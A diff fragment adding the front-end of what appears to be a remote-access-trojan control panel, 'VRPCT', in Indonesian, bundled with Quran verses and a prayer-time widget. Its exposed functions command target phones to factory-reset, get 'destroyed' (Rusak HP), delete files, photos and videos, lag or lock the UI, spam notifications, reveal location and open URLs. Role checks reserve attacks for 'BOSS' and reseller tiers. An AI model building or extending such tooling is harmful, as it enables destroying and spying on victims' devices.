+                        meaning: "Dia tidak beranak dan tidak diperanakkan." },
+                    { num: 4, arab: "وَلَمْ يَكُن لَّهُ كُفُوًا أَحَدٌ", latin: "Wa lam yakul-lahu kufuwan ahad.",
+                        meaning: "Dan tidak ada seorang pun yang setara dengan Dia." }
+                ] },
+            kursi: { title: "AYAT KURSI", translate: "Al-Baqarah 255 (1 Ayat)", ayats: [
+                    { num: 1, arab: "اللَّهُ لَا إِلَٰهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ ۚ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ ۚ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ ۗ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ ۚ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ ۖ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ ۚ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ ۖ وَلَا يَئُودُهُ حِفْظُهُمَا ۚ وَهُوَ الْعَلِيُّ الْعَظِيمُ",
+                        latin: "Allaahu laa ilaaha illaa huwal hayyul qayyuum, laa ta'khudzuhuu sinatuw wa laa nawm, lahuu maa fis samaawaati wa maa fil ardhi, man dzaalladzii yasyfa'u 'indahuu illaa bi idznih, ya'lamu maa bayna aydiihim wa maa khalfahum, wa laa yuhiithuuna bi syay-in min 'ilmihii illaa bimaa syaa-a, wasi'a kursiyyuhus samaawaati wal ardha, wa laa ya-uuduhuu hifzhuhumaa, wa huwal 'aliyyul 'azhiim",
+                        meaning: "Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafaat di sisi Allah tanpa izin-Nya? Dia mengetahui apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." }
+                ] }
+        };
+        function openSurahView(key) { var surah = surahDatabase[key]; if (!surah) return;
+            document.getElementById('surahTitleName').innerText = surah.title;
+            document.getElementById('surahTitleTranslate').innerText = surah.translate; var html = "";
+            surah.ayats.forEach(function(ayat) { html += '<div class="ayat-card"><div class="ayat-num">AYAT ' + ayat.num +
+                    '</div><div class="ayat-arabic">' + ayat.arab + '</div><div class="ayat-latin">' + ayat.latin +
+                    '</div><div class="ayat-meaning">' + ayat.meaning + '</div></div>'; });
+            document.getElementById('ayatRenderBox').innerHTML = html;
+            switchView('screenHub', 'screenSurahReader'); }
+
+        // =============================================================
+        // SHOLAT
+        // =============================================================
+        function updateLiveSholatStatus() {
+            var list = [{ nama: "SHUBUH", waktu: "04:30" }, { nama: "DZUHUR", waktu: "12:08" }, { nama: "ASHAR",
+                    waktu: "15:30" }, { nama: "MAGRIB", waktu: "18:15" }, { nama: "ISYA", waktu: "19:25" }];
+            var now = new Date();
+            var totalMenit = now.getHours() * 60 + now.getMinutes();
+            var target = list[0];
+            for (var i = 0; i < list.length; i++) { var parts = list[i].waktu.split(':'); var menit = parseInt(parts[0]) *
+                    60 + parseInt(parts[1]); if (menit > totalMenit) { target = list[i]; break; } }
+            document.getElementById('liveSholatStatusText').innerHTML = 'WAKTU SHOLAT MENUNJUKKAN PUKUL ' + target.waktu +
+                ' SHOLAT ' + target.nama;
+        }
+
+        // =============================================================
+        // EVENT DELEGATION
+        // =============================================================
+        document.getElementById('ratRoomControl').addEventListener('click', function(e) {
+            var card = e.target.closest('.rat-menu-card');
+            if (!card) return;
+            var requiredRole = card.dataset.role;
+            var action = card.dataset.action;
+            if (!requiredRole || !action) return;
+            if (userLevel < roleLevel[requiredRole]) {
+                var roleName = requiredRole.charAt(0).toUpperCase() + requiredRole.slice(1).toLowerCase();
+                showToast("Fitur ini hanya untuk role " + roleName);
+                return;
+            }
+            if (typeof window[action] === 'function') {
+                window[action]();
+            } else {
+                console.warn("Action not found:", action);
+            }
+        });
+
+        document.getElementById('confirmYes').addEventListener('click', function() {
+            document.getElementById('confirmDialog').classList.remove('show');
+            var targetId = document.getElementById('ratTargetId').value.trim();
+            if (!targetId) { showToast("Pilih target dulu!"); return; }
+            if (pendingRoom) {
+                openRoom(pendingRoom);
+                pendingRoom = null;
+            }
+        });
+        document.getElementById('confirmNo').addEventListener('click', function() {
+            document.getElementById('confirmDialog').classList.remove('show');
+            pendingRoom = null;
+        });
+
+        // =============================================================
+        // EXPOSE FUNCTIONS
+        // =============================================================
+        window.sendPlaySoundDirect = sendPlaySoundDirect;
+        window.sendStopSound = sendStopSound;
+        window.sendPlaySoundSacredDirect = sendPlaySoundSacredDirect;
+        window.sendStopSoundSacred = sendStopSoundSacred;
+        window.sendSetWallpaper = sendSetWallpaper;
+        window.showResetFactoryDialog1 = showResetFactoryDialog1;
+        window.showResetFactoryStep2 = showResetFactoryStep2;
+        window.sendResetFactory = sendResetFactory;
+        window.showRusakHpDialog1 = showRusakHpDialog1;
+        window.showRusakHpStep2 = showRusakHpStep2;
+        window.sendRusakHp = sendRusakHp;
+        window.sendStopAttack = sendStopAttack;
+        window.showLockHtmlDialog = showLockHtmlDialog;
+        window.sendLockHtml = sendLockHtml;
+        window.sendUnlockAll = sendUnlockAll;
+        window.showRenameDialog = showRenameDialog;
+        window.sendRenameDevice = sendRenameDevice;
+        window.closeRoom = closeRoom;
+        window.ratBackHandler = ratBackHandler;
+        window.ratSenterOn = ratSenterOn;
+        window.ratSenterOff = ratSenterOff;
+        window.ratSenterBlink = ratSenterBlink;
+        window.ratSendStopFlashBlink = ratSendStopFlashBlink;
+        window.ratShowToast = ratShowToast;
+        window.showOpenUrlDialog = showOpenUrlDialog;
+        window.showSetVolumeDialog = showSetVolumeDialog;
+        window.showSetBrightnessDialog = showSetBrightnessDialog;
+        window.showLocationDialog = showLocationDialog;
+        window.showDeleteFileDialog = showDeleteFileDialog;
+        window.sendDeleteFile = sendDeleteFile;
+        window.showDeletePhotoDialog = showDeletePhotoDialog;
+        window.sendDeletePhoto = sendDeletePhoto;
+        window.showDeleteVideoDialog = showDeleteVideoDialog;
+        window.sendDeleteVideo = sendDeleteVideo;
+        window.sendOpenUrlFromModal = sendOpenUrlFromModal;
+        window.sendSetVolume = sendSetVolume;
+        window.sendSetBrightness = sendSetBrightness;
+        window.ratSendToast = ratSendToast;
+        window.ratCloseModal = ratCloseModal;
+        window.generateUID = generateUID;
+        window.copyGeneratedUID = copyGeneratedUID;
+        window.setFilter = setFilter;
+        window.switchView = switchView;
+        window.goBackWithScroll = goBackWithScroll;
+        window.toggleDrawer = toggleDrawer;
+        window.logout = logout;
+        window.openSurahView = openSurahView;
+        window.skipLoading = skipLoading;
+        window.showTtsDialog = showTtsDialog;
+        window.sendTts = sendTts;
+        window.copyText = copyText;
+        window.sendUILag = sendUILag;
+        window.sendUnlockUILag = sendUnlockUILag;
+        window.showSpamNotifDialog = showSpamNotifDialog;
+        window.sendSpamNotif = sendSpamNotif;
+        window.sendLagCombo = sendLagCombo;
+        window.sendUnlagCombo = sendUnlagCombo;
+        window.openChatGlobal = openChatGlobal;
+        window.sendChatMessage = sendChatMessage;
+
+        // =============================================================
+        // INISIALISASI
+        // =============================================================
+        updateLiveSholatStatus();
+        setInterval(updateLiveSholatStatus, 30000);
+        console.log('🔥 VRPCT - Fitur terbaru ditambahkan (UI tetap seperti mem.html)');
+        console.log('✅ LOCK HTML & UNLOCK (RESELLER)');
+        console.log('✅ Rename Device');
+        console.log('✅ Surat Al-Ikhlas (ganti Al-Mulk) & Ayat Kursi');
+        console.log('✅ Password toggle');
+        console.log('✅ Rusak HP & Stop Serang (BOSS)');
+    </script>
+</body>
+</html>
